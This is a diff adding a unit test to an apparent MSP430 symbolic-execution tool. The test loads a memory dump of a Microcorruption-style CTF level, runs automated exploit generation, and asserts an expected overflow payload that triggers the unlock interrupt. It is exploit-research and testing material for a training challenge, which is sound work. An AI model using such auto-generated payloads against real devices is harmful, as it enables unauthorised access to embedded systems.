@@ -1,7 +1,7 @@
 import unittest
 
 from msp430_symex.state import start_path_group
-from msp430_symex.exploit import generate_exploit
+from msp430_symex.exploit import generate_exploit, UnsatExploitError
 
 class TestTutorial(unittest.TestCase):
     def test_tutorial(self):
@@ -426,6 +426,83 @@ fff0:   4244 4244 4244 4244 4244 4244 4244 0044   BDBDBDBDBDBDBD.D"""
         # TODO: validate exploitability by stepping until unlocked instead of checking strings
         exploit_str = b'\x7fC\x8f\x10\x02O3\x12~@\x10\xff\x8e\x12\xc0\xc0"4'
         self.assertEqual(winning_input, exploit_str)
+
+
+class TestMontevideo(unittest.TestCase):
+
+    def test_montevideo(self):
+        dump = \
+r"""0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............
+0010:   *
+4400:   3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@
+4410:   0000 0f93 0724 8245 5c01 2f83 9f4f 5846   .....$.E\./..OXF
+4420:   0024 f923 3f40 6400 0f93 0624 8245 5c01   .$.#?@d....$.E\.
+4430:   1f83 cf43 0024 fa23 b012 f444 32d0 f000   ...C.$.#...D2...
+4440:   fd3f 3040 5646 0412 0441 2453 2183 c443   .?0@VF...A$S!..C
+4450:   fcff 3e40 fcff 0e54 0e12 0f12 3012 7e00   ..>@...T....0.~.
+4460:   b012 4c45 5f44 fcff 8f11 3152 3441 3041   ..LE_D....1R4A0A
+4470:   456e 0a00 7220 7468 6520 7061 7373 776f   Enter the passwo
+4480:   7264 2074 6f20 636f 6e74 696e 7565 2e00   rd to continue..
+4490:   5265 0a00 6d62 6572 3a20 7061 7373 776f   Remember: passwo
+44a0:   7264 7320 6172 6520 6265 7477 6565 6e20   rds are between 
+44b0:   3820 616e 6420 3136 2063 6861 7261 6374   8 and 16 charact
+44c0:   6572 732e 0041 630a 0073 7320 6772 616e   ers..Access gran
+44d0:   7465 642e 0054 680a 0020 7061 7373 776f   ted..That passwo
+44e0:   7264 2069 7320 6e6f 7420 636f 7272 6563   rd is not correc
+44f0:   742e 0000 3150 f0ff 3f40 7044 b012 b045   t...1P..?@pD...E
+4500:   3f40 9044 b012 b045 3e40 3000 3f40 0024   ?@.D...E>@0.?@.$
+4510:   b012 a045 3e40 0024 0f41 b012 dc45 3d40   ...E>@.$.A...E=@
+4520:   6400 0e43 3f40 0024 b012 f045 0f41 b012   d..C?@.$...E.A..
+4530:   4644 0f93 0324 3f40 c544 023c 3f40 d544   FD...$?@.D.<?@.D
+4540:   b012 b045 3150 1000 3041 3041 1e41 0200   ...E1P..0A0A.A..
+4550:   0212 0f4e 8f10 024f 32d0 0080 b012 1000   ...N...O2.......
+4560:   3241 3041 2183 0f12 0312 814f 0400 b012   2A0A!......O....
+4570:   4c45 1f41 0400 3150 0600 3041 0412 0441   LE.A..1P..0A...A
+4580:   2453 2183 3f40 fcff 0f54 0f12 1312 b012   $S!.?@...T......
+4590:   4c45 5f44 fcff 8f11 3150 0600 3441 3041   LE_D....1P..4A0A
+45a0:   0e12 0f12 2312 b012 4c45 3150 0600 3041   ....#...LE1P..0A
+45b0:   0b12 0b4f 073c 1b53 8f11 0f12 0312 b012   ...O.<.S........
+45c0:   4c45 2152 6f4b 4f93 f623 3012 0a00 0312   LE!RoKO..#0.....
+45d0:   b012 4c45 2152 0f43 3b41 3041 0d4f 023c   ..LE!R.C;A0A.O.<
+45e0:   1e53 1d53 6c4e cd4c 0000 4c93 f923 3041   .S.SlN.L..L..#0A
+45f0:   0b12 0a12 0912 0812 0b4f 3d90 0600 082c   .........O=....,
+4600:   043c cb4e 0000 1b53 3d53 0d93 fa23 1e3c   .<.N...S=S...#.<
+4610:   4a4e 0a93 0324 0c4a 8c10 0adc 1fb3 0524   JN...$.J.......$
+4620:   3d53 cf4e 0000 0b4f 1b53 0c4d 12c3 0c10   =S.N...O.S.M....
+4630:   084b 094c 884a 0000 2853 3953 fb23 0c5c   .K.L.J..(S9S.#.\
+4640:   0c5b 1df3 0d99 0224 cc4e 0000 3841 3941   .[.....$.N..8A9A
+4650:   3a41 3b41 3041 0013 0000 0000 0000 0000   :A;A0A..........
+4660:   *
+ff80:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ff90:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffa0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffb0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffc0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffd0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+ffe0:   4244 4244 4244 4244 4244 4244 4244 4244   BDBDBDBDBDBDBDBD
+fff0:   4244 4244 4244 4244 4244 4244 4244 0044   BDBDBDBDBDBDBD.D"""
+        #TODO: automatically find avoid address via CFG
+        pg = start_path_group(dump, 0x4400, avoid=0x443c)
+
+        while True:
+            try:
+                pg.step_until_symbolic_ip()
+                sym_state = list(pg.symbolic)[0]
+                #print('SYMBOLIC PC =', sym_state.cpu.registers['R0'])
+                sym_state = generate_exploit(sym_state)
+                break # Found an exploit :D
+            except UnsatExploitError as e:
+                #print("Couldn't generate exploit!!! Moving on to next state...")
+                #print(e)
+                pg.symbolic = set()
+                pg.active.remove(sym_state)
+
+        winning_input = sym_state.sym_input.dump(sym_state)[0].rstrip(b'\xc0')
+
+        # TODO: validate exploitability by stepping until unlocked instead of checking strings
+        exploit_str = b'\x7fC\x8f\x10\x02O3\x12~@\x10\xff\x8e\x12\xff\xff\xeeC\x00'
+        self.assertEqual(winning_input, exploit_str)
+
 
 if __name__ == '__main__':
     unittest.main()
